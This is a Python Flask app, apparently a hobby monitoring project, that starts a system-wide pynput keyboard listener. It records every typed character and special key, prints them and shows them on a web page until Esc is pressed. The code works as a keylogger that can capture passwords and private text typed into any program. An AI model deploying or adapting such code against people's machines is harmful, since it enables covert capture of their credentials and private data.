import threading  

from flask import Flask, render_template  
from pynput import keyboard  
from waitress import serve 

app = Flask(__name__)

# Set of sensitive keys and symbols
sensitive_keys = {keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab, keyboard.Key.esc,
                  keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r,
                  keyboard.Key.caps_lock, keyboard.Key.space}  # Added space key to sensitive_keys
sensitive_symbols = set('!@#$%^&*()_+{}:"<>?|[]\\;,./`~')

# Global variables to store typed text and words
typed_text = ""
typed_words = []
typed_text2 = ""
typed_words2 = []
message = message2 = message3 = None
lock = threading.Lock()


def remove_duplicates(s):
    return s  

@app.route('/')
def index():
    global message3, message2, message
    with lock:
        message3 = "Monitoring started"
    return render_template('htmlt.html', message3=message3, message2=message2, message=message)

@app.route('/monitor', methods=['POST'])
def monitor_keys():
    global message, message2, message3

    
    def on_release(key):
        global message
        if key == keyboard.Key.esc:
            with lock:
                message = "The monitoring is closed"
            return False

    
    def on_press(key):
        global typed_text, typed_words, message2, message, typed_text2, typed_words2
        with lock:
            try:
                if hasattr(key, 'char') and (key.char.isalnum() or key.char in sensitive_symbols):
                    typed_text += key.char
                    typed_text2 += key.char
                    print(f"Char added: {key.char}") 
                elif key == keyboard.Key.space:
                    typed_text += ' '
                    typed_text2 += ' '
                    print("Space added")  
            except AttributeError:
                pass

            if key in sensitive_keys:
                typed_text += f" [{key}]"
                print(f"Sensitive key pressed: {key}")  
            
            if key == keyboard.Key.enter:
                if typed_text:
                    typed_words.append(typed_text)  
                    typed_text = ""  
                    message2 = "<br>".join(typed_words)  
                    print(f"Typed Words: {message2}")  

                if typed_text2:
                    typed_words2.append(typed_text2)  
                    typed_text2 = ""  
                    message = "<br>".join(typed_words2)  
                    print(f"Typed Words 2: {message}") 

   
    def start_key_listener():
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    
    if not hasattr(monitor_keys, 'key_listener_thread') or not monitor_keys.key_listener_thread.is_alive():
        monitor_keys.key_listener_thread = threading.Thread(target=start_key_listener)
        monitor_keys.key_listener_thread.start()

    return '', 204 

